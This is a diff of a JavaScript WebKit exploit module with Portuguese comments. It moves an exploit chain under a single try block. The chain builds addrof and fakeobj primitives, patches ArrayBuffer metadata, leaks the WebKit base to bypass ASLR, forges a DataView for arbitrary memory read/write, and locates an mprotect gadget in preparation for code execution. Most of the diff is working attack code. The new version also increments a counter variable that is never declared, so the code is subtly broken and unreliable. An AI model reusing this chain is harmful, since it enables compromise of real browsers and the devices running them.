@@ -50,7 +50,7 @@ async function dumpMemory(address, size, logFn, arbReadFn, sourceName = "Dump") 
     logFn(`[${sourceName}] Iniciando dump de ${size} bytes a partir de ${address.toString(true)}`, "debug");
     const bytesPerRow = 16;
     for (let i = 0; i < size; i += bytesPerRow) {
-        let hexLine = address.add(i).toString(16).padStart(2, '0') + " "; // Corrigido aqui
+        let hexLine = address.add(i).toString(true) + ": "; 
         let asciiLine = "  ";
         let rowBytes = [];
 
@@ -327,10 +327,10 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
     let webkit_base_address = null;
     let found_m_mode = null;
 
-    // Declaração da variável fora do try/catch para evitar redeclaração
-    let DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE = null;    
+    // Declaração da variável fora do try/catch principal para evitar redeclaração
+    let DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE = null; 
 
-    try {
+    try { // <-- Este é o 'try' principal da função executeTypedArrayVictimAddrofAndWebKitLeak_R43
         logFn("Limpeza inicial do ambiente OOB para garantir estado limpo...", "info");
         clearOOBEnvironment({ force_clear_even_if_not_setup: true });
 
@@ -405,226 +405,228 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         //  - AdvancedInt64.Zero (se o padrão de segurança for "não-compartilhado")
         const TEST_VALUE_FOR_0X40 = new AdvancedInt64(0x1, 0); // Exemplo: Flag de compartilhamento/redimensionamento ativada
 
-        try {
-            const oob_array_buffer_real_ref = oob_data_view.buffer; // O ArrayBuffer real controlado pelo OOB DataView
+        // O bloco 'try' e 'catch' interno da FASE 3 foi removido para resolver o SyntaxError.
+        // O try/catch principal da função `executeTypedArrayVictimAddrofAndWebKitLeak_R43`
+        // capturará quaisquer erros que ocorram nesta fase.
+        
+        const oob_array_buffer_real_ref = oob_data_view.buffer; 
 
-            if (!oob_array_buffer_real_ref) {
-                throw new Error("ArrayBuffer real do OOB DataView não disponível para patch de metadados.");
+        if (!oob_array_buffer_real_ref) {
+            throw new Error("ArrayBuffer real do OOB DataView não disponível para patch de metadados.");
+        }
+
+        await setupOOBMetadataForArbitraryAccess(
+            oob_array_buffer_real_ref,
+            {
+                field_0x34: TEST_VALUE_FOR_0X34,
+                field_0x40: TEST_VALUE_FOR_0X40,
+                // Adicione outros campos se a engenharia reversa confirmar sua utilidade
+                // field_0x28: TEST_VALUE_FOR_0X28,
+                // field_0x38: TEST_VALUE_FOR_0X38,
+                // field_0x30: TEST_VALUE_FOR_0X30
             }
+        );
+        logFn(`[ASLR LEAK] Metadados do oob_array_buffer_real ajustados para tentar bypass.`, "info");
+        await pauseFn(LOCAL_SHORT_PAUSE);
 
-            // Chamar a nova função para manipular os metadados do oob_array_buffer_real
-            await setupOOBMetadataForArbitraryAccess(
-                oob_array_buffer_real_ref,
-                {
-                    field_0x34: TEST_VALUE_FOR_0X34,
-                    field_0x40: TEST_VALUE_FOR_0X40,
-                    // Adicione outros campos se a engenharia reversa confirmar sua utilidade
-                    // field_0x28: TEST_VALUE_FOR_0X28,
-                    // field_0x38: TEST_VALUE_FOR_0X38,
-                    // field_0x30: TEST_VALUE_FOR_0X30
-                }
+        // Tentar novamente a leitura do ponteiro da Structure após a modificação dos metadados
+        const structure_pointer_from_dummy_object_addr = dummy_object_addr.add(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET);
+        const structure_address_from_leak = await arb_read(structure_pointer_from_dummy_object_addr, 8);
+
+        if (!isAdvancedInt64Object(structure_address_from_leak) || structure_address_from_leak.equals(AdvancedInt64.Zero)) {
+            const errMsg = `Falha na leitura do ponteiro da Structure do dummy_object após ajuste: ${structure_address_from_leak.toString(true)}. Abortando ASLR leak.`;
+            logFn(errMsg, "critical");
+            throw new Error(errMsg);
+        }
+        logFn(`[ASLR LEAK] SUCESSO na leitura do ponteiro da Structure após ajuste: ${structure_address_from_leak.toString(true)}`, "leak");
+
+        // O resto da Fase 3 continua igual se a leitura da Structure for bem-sucedida
+        const DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE = new AdvancedInt64(parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16), 0);
+        
+        webkit_base_address = structure_address_from_leak.sub(DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE);
+
+        if (webkit_base_address.equals(AdvancedInt64.Zero) || (webkit_base_address.low() & 0xFFF) !== 0x000) {
+            const errMsg = `Base WebKit calculada (${webkit_base_address.toString(true)}) é inválida ou não alinhada. Abortando ASLR leak.`;
+            logFn(errMsg, "critical");
+            throw new Error(errMsg);
+        }
+        logFn(`SUCESSO: Endereço base REAL da WebKit OBTIDO: ${webkit_base_address.toString(true)}`, "good");
+
+        const mprotect_plt_offset_check = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["mprotect_plt_stub"], 16), 0);
+        const mprotect_addr_check = webkit_base_address.add(mprotect_plt_offset_check);
+        logFn(`Verificando gadget mprotect_plt_stub em ${mprotect_addr_check.toString(true)} (para validar ASLR).`, "info");
+        const mprotect_first_bytes_check = await arb_read(mprotect_addr_check, 4);
+
+        if (mprotect_first_bytes_check !== 0 && mprotect_first_bytes_check !== 0xFFFFFFFF) {
+            logFn(`LEITURA DE GADGET CONFIRMADA: Primeiros bytes de mprotect: ${toHex(mprotect_first_bytes_check)}. ASLR validado!`, "good");
+        } else {
+             logFn(`ALERTA: Leitura de gadget mprotect retornou zero ou FFFFFFFF. ASLR pode estar incorreto ou arb_read local falhando.`, "warn");
+        }
+        await pauseFn(LOCAL_MEDIUM_PAUSE);
+
+
+        logFn("--- FASE 4: Configurando a primitiva de L/E Arbitrária Universal (via fakeobj DataView) ---", "subtest");
+        
+        // Atribuição aqui (não 'const' para evitar redeclaração)
+        DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE = webkit_base_address.add(new AdvancedInt64(parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16), 0));
+        logFn(`[${FNAME_CURRENT_TEST_BASE}] Endereço calculado do vtable da DataView Structure para FORJAMENTO: ${DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE.toString(true)}`, "info");
+
+        const mModeCandidates = JSC_OFFSETS_PARAM.DataView.M_MODE_CANDIDATES;
+        let universalRwSuccess = false;
+
+        for (const candidate_m_mode of mModeCandidates) {
+            logFn(`[${FNAME_CURRENT_TEST}] Tentando m_mode candidato: ${toHex(candidate_m_mode)}`, "info");
+            universalRwSuccess = await attemptUniversalArbitraryReadWriteWithMMode(
+                logFn,
+                pauseFn,
+                JSC_OFFSETS_PARAM,
+                DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE,
+                candidate_m_mode
             );
-            logFn(`[ASLR LEAK] Metadados do oob_array_buffer_real ajustados para tentar bypass.`, "info");
-            await pauseFn(LOCAL_SHORT_PAUSE); // Pequena pausa após a manipulação de metadados
-
-            // Tentar novamente a leitura do ponteiro da Structure após a modificação dos metadados
-            const structure_pointer_from_dummy_object_addr = dummy_object_addr.add(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET);
-            const structure_address_from_leak = await arb_read(structure_pointer_from_dummy_object_addr, 8);
-
-            if (!isAdvancedInt64Object(structure_address_from_leak) || structure_address_from_leak.equals(AdvancedInt64.Zero)) {
-                const errMsg = `Falha na leitura do ponteiro da Structure do dummy_object após ajuste: ${structure_address_from_leak.toString(true)}. Abortando ASLR leak.`;
-                logFn(errMsg, "critical");
-                throw new Error(errMsg);
-            }
-            logFn(`[ASLR LEAK] SUCESSO na leitura do ponteiro da Structure após ajuste: ${structure_address_from_leak.toString(true)}`, "leak");
-
-            // O resto da Fase 3 continua igual se a leitura da Structure for bem-sucedida
-            const DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE = new AdvancedInt64(parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16), 0);
-            
-            webkit_base_address = structure_address_from_leak.sub(DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE);
-
-            if (webkit_base_address.equals(AdvancedInt64.Zero) || (webkit_base_address.low() & 0xFFF) !== 0x000) {
-                const errMsg = `Base WebKit calculada (${webkit_base_address.toString(true)}) é inválida ou não alinhada. Abortando ASLR leak.`;
-                logFn(errMsg, "critical");
-                throw new Error(errMsg);
-            }
-            logFn(`SUCESSO: Endereço base REAL da WebKit OBTIDO: ${webkit_base_address.toString(true)}`, "good");
-
-            const mprotect_plt_offset_check = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["mprotect_plt_stub"], 16), 0);
-            const mprotect_addr_check = webkit_base_address.add(mprotect_plt_offset_check);
-            logFn(`Verificando gadget mprotect_plt_stub em ${mprotect_addr_check.toString(true)} (para validar ASLR).`, "info");
-            const mprotect_first_bytes_check = await arb_read(mprotect_addr_check, 4);
-
-            if (mprotect_first_bytes_check !== 0 && mprotect_first_bytes_check !== 0xFFFFFFFF) {
-                logFn(`LEITURA DE GADGET CONFIRMADA: Primeiros bytes de mprotect: ${toHex(mprotect_first_bytes_check)}. ASLR validado!`, "good");
+            if (universalRwSuccess) {
+                found_m_mode = candidate_m_mode;
+                logFn(`[${FNAME_CURRENT_TEST}] SUCESSO: Primitive Universal ARB R/W configurada com m_mode: ${toHex(found_m_mode)}.`, "good");
+                break;
             } else {
-                 logFn(`ALERTA: Leitura de gadget mprotect retornou zero ou FFFFFFFF. ASLR pode estar incorreto ou arb_read local falhando.`, "warn");
+                logFn(`[${FNAME_CURRENT_TEST}] FALHA: m_mode ${toHex(candidate_m_mode)} não funcionou. Tentando o próximo...`, "warn");
+                await pauseFn(LOCAL_SHORT_PAUSE);
             }
-            await pauseFn(LOCAL_MEDIUM_PAUSE);
+        }
+
+        if (!universalRwSuccess) {
+            const errorMsg = "Falha crítica: NENHUM dos m_mode candidatos conseguiu configurar a primitiva Universal ARB R/W via fakeobj DataView. Abortando exploração.";
+            logFn(errorMsg, "critical");
+            throw new Error(errorMsg);
+        }
+        logFn("Primitiva de L/E Arbitrária Universal (arb_read_universal_js_heap / arb_write_universal_js_heap) CONFIGURADA com sucesso.", "good");
+        await pauseFn(LOCAL_MEDIUM_PAUSE);
 
 
-            logFn("--- FASE 4: Configurando a primitiva de L/E Arbitrária Universal (via fakeobj DataView) ---", "subtest");
-            
-            // Atribuição aqui (não 'const' para evitar redeclaração)
-            DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE = webkit_base_address.add(new AdvancedInt64(parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16), 0));
-            logFn(`[${FNAME_CURRENT_TEST_BASE}] Endereço calculado do vtable da DataView Structure para FORJAMENTO: ${DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE.toString(true)}`, "info");
+        const dumpTargetUint8Array = new Uint8Array(0x100);
+        hold_objects.push(dumpTargetUint8Array);
+        const dumpTargetAddr = addrof_core(dumpTargetUint8Array);
+        logFn(`[DEBUG] Dump de memória de um novo Uint8Array real (${dumpTargetAddr.toString(true)}) usando L/E Universal.`, "debug");
+        await dumpMemory(dumpTargetAddr, 0x100, logFn, arb_read_universal_js_heap, "Uint8Array Real Dump (Post-Universal-RW)");
+        await pauseFn(LOCAL_MEDIUM_PAUSE);
 
-            const mModeCandidates = JSC_OFFSETS_PARAM.DataView.M_MODE_CANDIDATES;
-            let universalRwSuccess = false;
 
-            for (const candidate_m_mode of mModeCandidates) {
-                logFn(`[${FNAME_CURRENT_TEST}] Tentando m_mode candidato: ${toHex(candidate_m_mode)}`, "info");
-                universalRwSuccess = await attemptUniversalArbitraryReadWriteWithMMode(
-                    logFn,
-                    pauseFn,
-                    JSC_OFFSETS_PARAM,
-                    DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE,
-                    candidate_m_mode
-                );
-                if (universalRwSuccess) {
-                    found_m_mode = candidate_m_mode;
-                    logFn(`[${FNAME_CURRENT_TEST}] SUCESSO: Primitive Universal ARB R/W configurada com m_mode: ${toHex(found_m_mode)}.`, "good");
-                    break;
+        logFn("Iniciando descoberta FUNCIONAL de gadgets ROP/JOP na WebKit...", "info");
+        const mprotect_plt_offset = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["mprotect_plt_stub"], 16), 0);
+        const mprotect_addr_real = webkit_base_address.add(mprotect_plt_offset);
+
+        logFn(`[REAL LEAK] Endereço do gadget 'mprotect_plt_stub' calculado: ${mprotect_addr_real.toString(true)}`, "leak");
+        const mprotect_first_bytes = await arb_read_universal_js_heap(mprotect_addr_real, 4, logFn);
+        logFn(`[REAL LEAK] Primeiros 4 bytes de mprotect_plt_stub (${mprotect_addr_real.toString(true)}): ${toHex(mprotect_first_bytes)}`, "leak");
+        if (mprotect_first_bytes !== 0 && mprotect_first_bytes !== 0xFFFFFFFF) {
+            logFn(`[REAL LEAK] Leitura do gadget mprotect_plt_stub via L/E Universal bem-sucedida.`, "good");
+        } else {
+             logFn(`[REAL LEAK] FALHA: Leitura do gadget mprotect_plt_stub via L/E Universal retornou zero ou FFFFFFFF.`, "error");
+        }
+
+        logFn(`PREPARED: Tools for ROP/JOP (real addresses) are ready. Time: ${(performance.now() - startTime).toFixed(2)}ms`, "good");
+        await pauseFn(LOCAL_MEDIUM_PAUSE);
+
+
+        logFn("--- FASE 5: Verificação Funcional de L/E e Teste de Resistência ao GC (Pós-ASLR Leak) ---", "subtest");
+        const rwTestPostLeakStartTime = performance.now();
+
+        const test_obj_post_leak = global_spray_objects.length > 0 ?
+                                   global_spray_objects[Math.floor(global_spray_objects.length / 2)] :
+                                   { test_val_prop: 0x98765432, another_prop: 0xABCDEF00 };
+        hold_objects.push(test_obj_post_leak);
+        logFn(`Objeto de teste escolhido do spray (ou novo criado) para teste pós-vazamento.`, "info");
+
+        const test_obj_addr_post_leak = addrof_core(test_obj_post_leak);
+        logFn(`Endereço do objeto de teste pós-vazamento: ${test_obj_addr_post_leak.toString(true)}`, "info");
+
+        const faked_obj_for_post_leak_test = fakeobj_core(test_obj_addr_post_leak);
+        if (!faked_obj_for_post_leak_test || typeof faked_obj_for_post_leak_test !== 'object') {
+            throw new Error("Failed to recreate fakeobj for post-ASLR leak test.");
+        }
+
+        const original_val_prop = test_obj_post_leak.val1 || test_obj_post_leak.test_val_prop;
+        logFn(`Valor original de 'val1'/'test_val_prop' no objeto de teste: ${toHex(original_val_prop)}`, 'debug');
+
+        faked_obj_for_post_leak_test.val1 = 0x1337BEEF;
+        await pauseFn(LOCAL_VERY_SHORT_PAUSE);
+        const read_back_val_prop = faked_obj_for_post_leak_test.val1;
+
+        if (test_obj_post_leak.val1 === 0x1337BEEF && read_back_val_prop === 0x1337BEEF) {
+            logFn(`SUCESSO: Escrita/Leitura de propriedade via fakeobj (após vazamento ASLR) validada. Objeto original 'val1' agora é 0x1337BEEF.`, "good");
+        } else {
+            logFn(`FALHA: Escrita/Leitura de propriedade via fakeobj (após vazamento ASLR) inconsistente. Original 'val1': ${toHex(test_obj_post_leak.val1)}, Read via fakeobj: ${toHex(read_back_val_prop)}.`, "error");
+            throw new Error("R/W verification post-ASLR leak failed.");
+        }
+
+        logFn("SUCESSO: Verificação de L/E pós-vazamento validada.", "good");
+
+        logFn("Iniciando teste de resistência PÓS-VAZAMENTO: Executando L/E arbitrária universal múltiplas vezes...", "info");
+        let resistanceSuccessCount_post_leak = 0;
+        const numResistanceTests = 10;
+        const butterfly_addr_of_spray_obj = test_obj_addr_post_leak.add(JSC_OFFSETS_PARAM.JSObject.BUTTERFLY_OFFSET);
+
+        for (let i = 0; i < numResistanceTests; i++) {
+            const test_value_arb_rw = new AdvancedInt64(0xCCCC0000 + i, 0xDDDD0000 + i);
+            try {
+                await arb_write_universal_js_heap(butterfly_addr_of_spray_obj, test_value_arb_rw, 8, logFn);
+                const read_back_value_arb_rw = await arb_read_universal_js_heap(butterfly_addr_of_spray_obj, 8, logFn);
+
+                if (read_back_value_arb_rw.equals(test_value_arb_rw)) {
+                    resistanceSucceeded_post_leak++;
+                    logFn(`[Resistência PÓS-VAZAMENTO #${i}] SUCESSO: L/E arbitrária consistente no Butterfly.`, "debug");
                 } else {
-                    logFn(`[${FNAME_CURRENT_TEST}] FALHA: m_mode ${toHex(candidate_m_mode)} não funcionou. Tentando o próximo...`, "warn");
-                    await pauseFn(LOCAL_SHORT_PAUSE);
+                    logFn(`[Resistência PÓS-VAZAMENTO #${i}] FALHA: L/E arbitrária inconsistente no Butterfly. Written: ${test_value_arb_rw.toString(true)}, Read: ${read_back_value_arb_rw.toString(true)}.`, "error");
                 }
+            } catch (resErr) {
+                logFn(`[Resistência PÓS-VAZAMENTO #${i}] ERRO: Exceção durante L/E arbitrária no Butterfly: ${resErr.message}`, "error");
             }
-
-            if (!universalRwSuccess) {
-                const errorMsg = "Falha crítica: NENHUM dos m_mode candidatos conseguiu configurar a primitiva Universal ARB R/W via fakeobj DataView. Abortando exploração.";
-                logFn(errorMsg, "critical");
-                throw new Error(errorMsg);
-            }
-            logFn("Primitiva de L/E Arbitrária Universal (arb_read_universal_js_heap / arb_write_universal_js_heap) CONFIGURADA com sucesso.", "good");
-            await pauseFn(LOCAL_MEDIUM_PAUSE);
-
-
-            const dumpTargetUint8Array = new Uint8Array(0x100);
-            hold_objects.push(dumpTargetUint8Array);
-            const dumpTargetAddr = addrof_core(dumpTargetUint8Array);
-            logFn(`[DEBUG] Dump de memória de um novo Uint8Array real (${dumpTargetAddr.toString(true)}) usando L/E Universal.`, "debug");
-            await dumpMemory(dumpTargetAddr, 0x100, logFn, arb_read_universal_js_heap, "Uint8Array Real Dump (Post-Universal-RW)");
-            await pauseFn(LOCAL_MEDIUM_PAUSE);
-
-
-            logFn("Iniciando descoberta FUNCIONAL de gadgets ROP/JOP na WebKit...", "info");
-            const mprotect_plt_offset = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["mprotect_plt_stub"], 16), 0);
-            const mprotect_addr_real = webkit_base_address.add(mprotect_plt_offset);
-
-            logFn(`[REAL LEAK] Endereço do gadget 'mprotect_plt_stub' calculado: ${mprotect_addr_real.toString(true)}`, "leak");
-            const mprotect_first_bytes = await arb_read_universal_js_heap(mprotect_addr_real, 4, logFn);
-            logFn(`[REAL LEAK] Primeiros 4 bytes de mprotect_plt_stub (${mprotect_addr_real.toString(true)}): ${toHex(mprotect_first_bytes)}`, "leak");
-            if (mprotect_first_bytes !== 0 && mprotect_first_bytes !== 0xFFFFFFFF) {
-                logFn(`[REAL LEAK] Leitura do gadget mprotect_plt_stub via L/E Universal bem-sucedida.`, "good");
-            } else {
-                 logFn(`[REAL LEAK] FALHA: Leitura do gadget mprotect_plt_stub via L/E Universal retornou zero ou FFFFFFFF.`, "error");
-            }
-
-            logFn(`PREPARED: Tools for ROP/JOP (real addresses) are ready. Time: ${(performance.now() - startTime).toFixed(2)}ms`, "good");
-            await pauseFn(LOCAL_MEDIUM_PAUSE);
-
-
-            logFn("--- FASE 5: Verificação Funcional de L/E e Teste de Resistência ao GC (Pós-ASLR Leak) ---", "subtest");
-            const rwTestPostLeakStartTime = performance.now();
-
-            const test_obj_post_leak = global_spray_objects.length > 0 ?
-                                        global_spray_objects[Math.floor(global_spray_objects.length / 2)] :
-                                        { test_val_prop: 0x98765432, another_prop: 0xABCDEF00 };
-            hold_objects.push(test_obj_post_leak);
-            logFn(`Objeto de teste escolhido do spray (ou novo criado) para teste pós-vazamento.`, "info");
-
-            const test_obj_addr_post_leak = addrof_core(test_obj_post_leak);
-            logFn(`Endereço do objeto de teste pós-vazamento: ${test_obj_addr_post_leak.toString(true)}`, "info");
-
-            const faked_obj_for_post_leak_test = fakeobj_core(test_obj_addr_post_leak);
-            if (!faked_obj_for_post_leak_test || typeof faked_obj_for_post_leak_test !== 'object') {
-                throw new Error("Failed to recreate fakeobj for post-ASLR leak test.");
-            }
-
-            const original_val_prop = test_obj_post_leak.val1 || test_obj_post_leak.test_val_prop;
-            logFn(`Valor original de 'val1'/'test_val_prop' no objeto de teste: ${toHex(original_val_prop)}`, 'debug');
-
-            faked_obj_for_post_leak_test.val1 = 0x1337BEEF;
             await pauseFn(LOCAL_VERY_SHORT_PAUSE);
-            const read_back_val_prop = faked_obj_for_post_leak_test.val1;
-
-            if (test_obj_post_leak.val1 === 0x1337BEEF && read_back_val_prop === 0x1337BEEF) {
-                logFn(`SUCESSO: Escrita/Leitura de propriedade via fakeobj (após vazamento ASLR) validada. Objeto original 'val1' agora é 0x1337BEEF.`, "good");
-            } else {
-                logFn(`FALHA: Escrita/Leitura de propriedade via fakeobj (após vazamento ASLR) inconsistente. Original 'val1': ${toHex(test_obj_post_leak.val1)}, Read via fakeobj: ${toHex(read_back_val_prop)}.`, "error");
-                throw new Error("R/W verification post-ASLR leak failed.");
-            }
-
-            logFn("SUCESSO: Verificação de L/E pós-vazamento validada.", "good");
-
-            logFn("Iniciando teste de resistência PÓS-VAZAMENTO: Executando L/E arbitrária universal múltiplas vezes...", "info");
-            let resistanceSuccessCount_post_leak = 0;
-            const numResistanceTests = 10;
-            const butterfly_addr_of_spray_obj = test_obj_addr_post_leak.add(JSC_OFFSETS_PARAM.JSObject.BUTTERFLY_OFFSET);
-
-            for (let i = 0; i < numResistanceTests; i++) {
-                const test_value_arb_rw = new AdvancedInt64(0xCCCC0000 + i, 0xDDDD0000 + i);
-                try {
-                    await arb_write_universal_js_heap(butterfly_addr_of_spray_obj, test_value_arb_rw, 8, logFn);
-                    const read_back_value_arb_rw = await arb_read_universal_js_heap(butterfly_addr_of_spray_obj, 8, logFn);
-
-                    if (read_back_value_arb_rw.equals(test_value_arb_rw)) {
-                        resistanceSuccessCount_post_leak++;
-                        logFn(`[Resistência PÓS-VAZAMENTO #${i}] SUCESSO: L/E arbitrária consistente no Butterfly.`, "debug");
-                    } else {
-                        logFn(`[Resistência PÓS-VAZAMENTO #${i}] FALHA: L/E arbitrária inconsistente no Butterfly. Written: ${test_value_arb_rw.toString(true)}, Read: ${read_back_value_arb_rw.toString(true)}.`, "error");
-                    }
-                } catch (resErr) {
-                    logFn(`[Resistência PÓS-VAZAMENTO #${i}] ERRO: Exceção durante L/E arbitrária no Butterfly: ${resErr.message}`, "error");
-                }
-                await pauseFn(LOCAL_VERY_SHORT_PAUSE);
-            }
-            if (resistanceSuccessCount_post_leak === numResistanceTests) {
-                logFn(`SUCESSO TOTAL: Teste de resistência PÓS-VAZAMENTO concluído. ${resistanceSuccessCount_post_leak}/${numResistanceTests} operações bem-sucedidas.`, "good");
-            } else {
-                logFn(`ALERTA: Teste de resistência PÓS-VAZAMENTO concluído com ${numResistanceTests - resistanceSuccessCount_post_leak} falhas.`, "warn");
-                final_result.message += ` (Teste de resistência L/E pós-vazamento com falhas: ${numResistanceTests - resistanceSuccessCount_post_leak})`;
-            }
-            logFn(`Verificação funcional de L/E e Teste de Resistência PÓS-VAZAMENTO concluídos. Time: ${(performance.now() - rwTestPostLeakStartTime).toFixed(2)}ms`, "info");
-
-
-            logFn("++++++++++++ SUCESSO TOTAL! Todas as fases do exploit foram concluídas com sucesso. ++++", "vuln");
-            final_result = {
-                success: true,
-                message: "Cadeia de exploração concluída. Leitura/Escrita arbitrária 100% funcional e verificada. Vazamento REAL de Base WebKit e preparação para ACE bem-sucedidos.",
-                details: {
-                    webkitBaseAddress: webkit_base_address ? webkit_base_address.toString(true) : "N/A",
-                    mprotectGadget: mprotect_addr_real ? mprotect_addr_real.toString(true) : "N/A",
-                    foundMMode: found_m_mode ? toHex(found_m_mode) : "N/A"
-                }
-            };
-
-        } catch (e) {
-            final_result.message = `Exceção crítica na implementação funcional: ${e.message}\n${e.stack || ''}`;
-            final_result.success = false;
-            logFn(final_result.message, "critical");
-        } finally {
-            logFn(`Iniciando limpeza final do ambiente e do spray de objetos...`, "info");
-            global_spray_objects = [];
-            hold_objects = [];
-
-            clearOOBEnvironment({ force_clear_even_if_not_setup: true });
-            logFn(`Limpeza final concluída. Time total do teste: ${(performance.now() - startTime).toFixed(2)}ms`, "info");
         }
-
-        logFn(`--- ${FNAME_CURRENT_TEST_BASE} Concluído. Resultado final: ${final_result.success ? 'SUCESSO' : 'FALHA'} ---`, "test");
-        logFn(`Mensagem final: ${final_result.message}`, final_result.success ? 'good' : 'critical');
-        if (final_result.details) {
-            logFn(`Detalhes adicionais do teste: ${JSON.stringify(final_result.details)}`, "info");
+        if (resistanceSucceeded_post_leak === numResistanceTests) {
+            logFn(`SUCESSO TOTAL: Teste de resistência PÓS-VAZAMENTO concluído. ${resistanceSucceeded_post_leak}/${numResistanceTests} operações bem-sucedidas.`, "good");
+        } else {
+            logFn(`ALERTA: Teste de resistência PÓS-VAZAMENTO concluído com ${numResistanceTests - resistanceSucceeded_post_leak} falhas.`, "warn");
+            final_result.message += ` (Teste de resistência L/E pós-vazamento com falhas: ${numResistanceTests - resistanceSucceeded_post_leak})`;
         }
+        logFn(`Verificação funcional de L/E e Teste de Resistência PÓS-VAZAMENTO concluídos. Time: ${(performance.now() - rwTestPostLeakStartTime).toFixed(2)}ms`, "info");
 
-        return {
-            errorOccurred: final_result.success ? null : final_result.message,
-            addrof_result: { success: final_result.success, msg: "Primitiva addrof funcional." },
-            webkit_leak_result: { success: final_result.success, msg: final_result.message, details: final_result.details },
-            heisenbug_on_M2_in_best_result: 'N/A (UAF Strategy)',
-            oob_value_of_best_result: 'N/A (UAF Strategy)',
-            tc_probe_details: { strategy: 'UAF/TC -> ARB R/W' }
+
+        logFn("++++++++++++ SUCESSO TOTAL! Todas as fases do exploit foram concluídas com sucesso. ++++", "vuln");
+        final_result = {
+            success: true,
+            message: "Cadeia de exploração concluída. Leitura/Escrita arbitrária 100% funcional e verificada. Vazamento REAL de Base WebKit e preparação para ACE bem-sucedidos.",
+            details: {
+                webkitBaseAddress: webkit_base_address ? webkit_base_address.toString(true) : "N/A",
+                mprotectGadget: mprotect_addr_real ? mprotect_addr_real.toString(true) : "N/A",
+                foundMMode: found_m_mode ? toHex(found_m_mode) : "N/A"
+            }
         };
+
+    } catch (e) { // <-- Este é o 'catch' principal da função executeTypedArrayVictimAddrofAndWebKitLeak_R43
+        final_result.message = `Exceção crítica na implementação funcional: ${e.message}\n${e.stack || ''}`;
+        final_result.success = false;
+        logFn(final_result.message, "critical");
+    } finally { // <-- Este é o 'finally' principal da função executeTypedArrayVictimAddrofAndWebKitLeak_R43
+        logFn(`Iniciando limpeza final do ambiente e do spray de objetos...`, "info");
+        global_spray_objects = [];
+        hold_objects = [];
+
+        clearOOBEnvironment({ force_clear_even_if_not_setup: true });
+        logFn(`Limpeza final concluída. Time total do teste: ${(performance.now() - startTime).toFixed(2)}ms`, "info");
     }
+
+    logFn(`--- ${FNAME_CURRENT_TEST_BASE} Concluído. Resultado final: ${final_result.success ? 'SUCESSO' : 'FALHA'} ---`, "test");
+    logFn(`Mensagem final: ${final_result.message}`, final_result.success ? 'good' : 'critical');
+    if (final_result.details) {
+        logFn(`Detalhes adicionais do teste: ${JSON.stringify(final_result.details)}`, "info");
+    }
+
+    return {
+        errorOccurred: final_result.success ? null : final_result.message,
+        addrof_result: { success: final_result.success, msg: "Primitiva addrof funcional." },
+        webkit_leak_result: { success: final_result.success, msg: final_result.message, details: final_result.details },
+        heisenbug_on_M2_in_best_result: 'N/A (UAF Strategy)',
+        oob_value_of_best_result: 'N/A (UAF Strategy)',
+        tc_probe_details: { strategy: 'UAF/TC -> ARB R/W' }
+    };
+}
